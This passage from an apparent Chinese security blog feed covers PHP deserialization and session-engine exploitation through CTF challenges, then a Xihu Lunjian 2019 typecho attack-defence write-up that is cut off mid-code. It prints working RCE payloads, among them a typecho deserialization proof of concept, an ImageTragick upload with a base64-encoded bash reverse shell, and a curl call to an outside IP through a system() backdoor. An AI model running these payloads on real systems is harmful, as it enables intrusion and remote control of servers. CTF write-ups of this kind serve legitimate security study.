B中有echo操作，会输出$b的值，我们也知道$b的值很容易控制，但是如何触发<strong>call()方法呢？<br>查阅官方手册，我们发现：在对象中调用一个不可访问方法时，</strong>call() 会被调用。<br>所以下一步我们要继续寻找，是否有对象调用了不可访问方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c-&gt;no();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>我们再class C中发现<strong>destruct()魔法方法，其中调用了不可访问方法no()，我们看一下如何触发：析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。<br>所以整个利用链呼之欲出了：<br>1.使用Class C中的</strong>destruct()触发不可访问方法调用<br>2.通过不可访问方法调用触发Class B中<strong>call方法<br>3.通过</strong>call方法中的echo，使其输出对象，触发ClassA中__toString方法<br>4.通过Class A中的$a进行RCE<br>所以我们可以完整构造如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sky1 = <span class="keyword">new</span> A();</span><br><span class="line">$sky1-&gt;a = <span class="string">"system('ls /tmp');"</span>;</span><br><span class="line">$sky2 = <span class="keyword">new</span> B();</span><br><span class="line">$sky2-&gt;b = $sky1;</span><br><span class="line">$sky3 = <span class="keyword">new</span> C();</span><br><span class="line">$sky3-&gt;c = $sky2;</span><br><span class="line">var_dump(serialize($sky3));</span><br></pre></td></tr></table></figure></p><p>即可完成利用，进行RCE。</p><h2 id="session序列化引擎漏洞"><a href="#session序列化引擎漏洞" class="headerlink" title="session序列化引擎漏洞"></a>session序列化引擎漏洞</h2><h3 id="session序列化引擎样例"><a href="#session序列化引擎样例" class="headerlink" title="session序列化引擎样例"></a>session序列化引擎样例</h3><p>众所周知，session会将数据以序列化的格式存储在服务端，我们写如下测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'login_ok'</span>] = <span class="keyword">true</span>;</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sky'</span>;</span><br><span class="line">$_SESSION[<span class="string">'age'</span>] = <span class="number">9999</span>;</span><br></pre></td></tr></table></figure></p><p>我们从默认路径找到session数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_027m6oo5ok4e22qaevsag7r7m0</span><br></pre></td></tr></table></figure></p><p>内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_ok|b:1;name|s:3:&quot;sky&quot;;age|i:9999;</span><br></pre></td></tr></table></figure></p><p>那么这是什么存储格式呢？查阅相关手册，可以得知session序列化具有以下3种不同的引擎：<br>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值。<br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值。<br>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值。<br>而在没有指定引擎的时候，会默认使用php引擎。<br>如果我们指定引擎:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'login_ok'</span>] = <span class="keyword">true</span>;</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sky'</span>;</span><br><span class="line">$_SESSION[<span class="string">'age'</span>] = <span class="number">9999</span>;</span><br></pre></td></tr></table></figure></p><p>此时session文件内容变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:8:&quot;login_ok&quot;;b:1;s:4:&quot;name&quot;;s:3:&quot;sky&quot;;s:3:&quot;age&quot;;i:9999;&#125;</span><br></pre></td></tr></table></figure></p><p>那么如果程序在存储session时用的引擎与解码session时用的引擎不同，是否会触发问题呢？答案是显然的。</p><h3 id="session序列化引擎漏洞实战（一）"><a href="#session序列化引擎漏洞实战（一）" class="headerlink" title="session序列化引擎漏洞实战（一）"></a>session序列化引擎漏洞实战（一）</h3><p>还是以Jarvis OJ的一道题做样例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32784/</span><br></pre></td></tr></table></figure></p><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在本题中我们看到，从头到尾并未有传入序列化和反序列化的点。但是翻阅phpinfo()：<br><img src="/images/2019-05-05-11-09-08.png" alt=""><br>熟悉的同学应该都知道，一旦session.upload_progress.enabled开启，我们是可以控制session文件内容的，可参考这篇文章：<a href="https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress。">https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress。</a><br>这样一来，我们即可控制session文件内容，在触发session读取的时候，会进行反序列化。根据代码不难发现，2个魔法方法都是我们之前提及的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可控制$mdzz进行任意RCE，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:22:&quot;var_dump(scandir(&apos;.&apos;))&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>但是紧接着问题又来了，我们的input为php_serialize，但题目的引擎为php，那么如何让他进行成功反序列化呢?<br>这里就要和php的格式有关了，我们根据之前的内容知道：php存储方式是，键名+竖线+经过serialize()函数序列处理的值。<br>那么竖线之前为键名，竖线之后为经过serialize()函数序列处理的值，所以我们只要构造如下poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:22:&quot;var_dump(scandir(&apos;.&apos;))&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>即可成功利用php的解析规则，让我们的恶意序列化payload被当做key然后经过反序列化被成功触发。<br>那么为什么程序会反序列化呢？下图给了我们很好的解释：<br><img src="/images/2019-05-05-14-54-50.jpg" alt=""></p><h3 id="session序列化引擎漏洞实战（二）"><a href="#session序列化引擎漏洞实战（二）" class="headerlink" title="session序列化引擎漏洞实战（二）"></a>session序列化引擎漏洞实战（二）</h3><p>又如2018 LCTF这样一道题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目要求我们用上述代码，进行SSRF，仿造127.0.0.1请求flag.php即可拿到flag。同时作者禁用了一些危险函数。详细的题解我已经写在这篇文章了：<a href="https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge。此处我们只做一些思路上的剖析。">https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge。此处我们只做一些思路上的剖析。</a><br>首先我们观察到两个命令执行函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p><p>第一行想进行RCE还是非常容易的，我们直接传递两个参数即可。但第二行看起来并不可控。实际上我们可以用变量覆盖的思想，使用第一行覆盖$b，也能有一些用处，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?f=extract</span><br><span class="line"></span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure></p><p>那么这道题如何进行SSRF呢？实际上这和php的内置类有关：SoapClient。<br><img src="/images/2019-05-05-14-44-56.png" alt=""><br>这个类非常有趣，他有一个魔法方法为：<strong>call，我们可以利用该方法触发我们想做的操作。这里就不再展开SoapClient的通信功能了。有兴趣可以去看上述链接。<br>我们知道魔法方法</strong>call的触发方式是对象调用不可访问方法，那么本题里怎么让SoapClient调用不可访问方法呢？之前我说过b参数可以覆盖为call_user_func，这样答案就呼之欲出了：<br><img src="/images/2019-05-05-14-51-22.jpg" alt=""><br>如图即可成功触发SoapClient调用不可访问方法：welcome_to_the_lctf2018，触发后对象将会发起通讯请求，模拟127.0.0.1访问flag.php。<br>那么如何先把对象存入程序呢？这里即用到之前所说的session序列化引擎的问题。我们可以先让序列化引擎为php_serialize，在取出数据时，不指定引擎，则默认使用php引擎去反序列化，从而达成不被引擎的解析结构所干扰的目的。<br>那么如何设置session序列化引擎呢？这里我们利用如下这行命令即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET[f],$_POST);</span><br></pre></td></tr></table></figure></p><p>然后发起如下请求，即可达到目的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?f=session_start</span><br><span class="line"></span><br><span class="line">serialize_handler=php</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>由于篇幅有限，本篇文章只能暂且两则知识点：1.利用魔法方法攻击，2.利用session序列化引擎攻击。后续有时间会继续带来更深入的奇技淫巧，敬请期待~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期因为内部培训有序列化的需求，于是趁此机会由浅入深的剖析一下序列化相关内容。&lt;br&gt;之前也写过由浅入深的xml漏洞系列，欢迎阅读：&lt;br&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019西湖论剑AD攻防Web题解</title>
    <link href="http://skysec.top/2019/04/25/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91AD%E6%94%BB%E9%98%B2Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://skysec.top/2019/04/25/2019西湖论剑AD攻防Web题解/</id>
    <published>2019-04-25T01:50:38.000Z</published>
    <updated>2019-05-01T05:44:38.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周参加了西湖论剑线下赛，在AD攻防赛中喜迎冠军，以下是AD攻防赛中2道web的题解。</p><h2 id="Web1-typecho"><a href="#Web1-typecho" class="headerlink" title="Web1 - typecho"></a>Web1 - typecho</h2><p>整体源码如下<br><img src="/images/2019-04-25-12-32-36.png" alt=""><br>因为是typecho CMS，所以肯定有已知CVE，由于之前审计过，这就不重新分析了，只分析人为加入的。</p><h3 id="漏洞1-反序列化CVE"><a href="#漏洞1-反序列化CVE" class="headerlink" title="漏洞1 - 反序列化CVE"></a>漏洞1 - 反序列化CVE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</span><br></pre></td></tr></table></figure><p>可参加我以前分析的这篇文章，构造如下序列化，进行RCE<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type=<span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'0'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'author'</span>=&gt; <span class="keyword">new</span> Typecho_Request())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$poc = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line"><span class="string">'prefix'</span>=&gt;<span class="string">'typecho'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($poc));</span><br></pre></td></tr></table></figure></p><h3 id="漏洞2-Imagick"><a href="#漏洞2-Imagick" class="headerlink" title="漏洞2 - Imagick"></a>漏洞2 - Imagick</h3><p>通过源码diff，可以发现<br>/var/Widget/Users/Profile.php<br>有明显不同，插入了一大段代码<br><img src="/images/2019-04-25-13-30-33.png" alt=""><br>我们审计这段代码，可以发现关键点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $image = <span class="keyword">new</span> Imagick($file[<span class="string">'tmp_name'</span>]);</span><br><span class="line">    $image-&gt;scaleImage(<span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    file_put_contents($path, $image-&gt;getImageBlob());</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;widget(<span class="string">'Widget_Notice'</span>)-&gt;set(_t(<span class="string">"头像上传失败"</span>), <span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;response-&gt;goBack();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码使用了Imagick()，而该函数存在RCE漏洞<br>我们以如下代码为例进行测试<br><img src="/images/2019-04-25-13-44-23.png" alt=""><br>构造上传内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;exp.gif&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pICZndDsmIC9kZXYvdGNwL2lwL3BvcnQgMCZndDsmMQ== | base64 -d | bash`&quot;| cat flag &quot; )&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p><p>即可RCE</p><h3 id="漏洞3-authcode泄露"><a href="#漏洞3-authcode泄露" class="headerlink" title="漏洞3 - authcode泄露"></a>漏洞3 - authcode泄露</h3><p>我们diff可以发现如下路径，存在新增文件：<br>/var/Sitemap.php<br><img src="/images/2019-04-25-13-36-41.png" alt=""><br>我们审计代码发现关键点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ab</span><span class="params">($a=<span class="string">'a'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $b = authcode(base64_decode(<span class="string">'MjJkZnFseEVScHcxWkU5c08raGxoOUJzWGFKM0F3NWVPMm5QUUFISm5WSDhuTGc='</span>));</span><br><span class="line">    $b($a);</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    ob_start(ab);</span><br><span class="line">    <span class="keyword">echo</span> authcode($_GET[<span class="string">'site'</span>]);</span><br><span class="line">    ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们直接var_dump($b)，发现为system，即此处如果可控$a，则可进行RCE<br>我们测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ab</span><span class="params">($a=<span class="string">'a'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// replace all the apples with oranges</span></span><br><span class="line"><span class="keyword">return</span> system($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start(<span class="string">"ab"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">curl <span class="number">106.14</span><span class="number">.114</span><span class="number">.127</span>:<span class="number">24444</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可收到请求<br><img src="/images/2019-04-25-14-04-28.png" alt=""><br>则不难发现，如果我们能控制如下函数的输出内容，即可进行任意RCE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authcode($_GET[&apos;site&apos;]);</span><br></pre></td></tr></table></figure></p><p>那我们跟进authcode<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authcode</span><span class="params">($string, $key = <span class="string">'12333010101'</span>)</span> </span>&#123;</span><br><span class="line">    $ckey_length = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    $key = md5($key ? $key : $GLOBALS[<span class="string">'discuz_auth_key'</span>]);</span><br><span class="line"></span><br><span class="line">    $keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    $keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    $keyc = substr($string, <span class="number">0</span>, $ckey_length);</span><br><span class="line"></span><br><span class="line">    $cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">    $key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">    $string =  base64_decode(substr($string, $ckey_length));</span><br><span class="line">    $string_length = strlen($string);</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    $box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    $rndkey = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">        $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">        $j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$i];</span><br><span class="line">        $box[$i] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">        $a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        $j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>依次分析，首先key已知为12333010101，那么<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">$key_length = strlen($cryptkey);</span><br></pre></td></tr></table></figure></p><p>分别为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">afbedca20d58ccf2ceab39618a931d526ba4b613c047adffd92173daa701cdb6</span><br><span class="line">64</span><br></pre></td></tr></table></figure></p><p>然后操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$string =  base64_decode(substr($string, $ckey_length));</span><br><span class="line">$string_length = strlen($string);</span><br></pre></td></tr></table></figure></p><p>所以我们构造的payload的base64长度要小于64<br>然后是一堆流密钥生成步骤，到最后解密这一块<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">        $a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        $j = ($j + 